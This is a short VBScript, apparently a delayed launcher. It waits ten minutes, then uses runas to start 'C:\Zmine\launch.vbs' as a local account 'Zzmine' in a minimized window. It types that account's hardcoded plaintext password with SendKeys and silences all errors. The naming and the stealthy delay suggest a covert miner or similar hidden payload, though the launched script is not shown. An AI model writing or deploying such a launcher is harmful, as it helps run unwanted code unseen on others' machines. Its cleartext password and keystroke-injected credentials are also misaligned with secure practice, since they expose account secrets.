sUser1="Zzmine"

sCmd1="wscript C:\Zmine\launch.vbs"
'sCmd1="calc.exe"

sPass1="Zzmine"&CHR(13) 

 

On Error Resume Next

dim WshShell,FSO

dim CRLF

Wscript.Sleep 600000
 

set WshShell = CreateObject("WScript.Shell")

set WshEnv = WshShell.Environment("Process")

WinPath = WshEnv("SystemRoot")&"\System32\runas.exe"

set FSO = CreateObject("Scripting.FileSystemObject")

 

CLRF = chr(10) & chr(13)

rc=WshShell.Run("runas /user:" & sUser1 & " " & CHR(34) & sCmd1 & CHR(34), 2, FALSE)

Wscript.Sleep 3000 

WshShell.AppActivate(WinPath)

WshShell.SendKeys sPass1 & CRLF

WScript.Sleep 3000

set WshShell=Nothing

set oArgs=Nothing

set WshEnv=Nothing

set FSO=Nothing

 

wscript.quit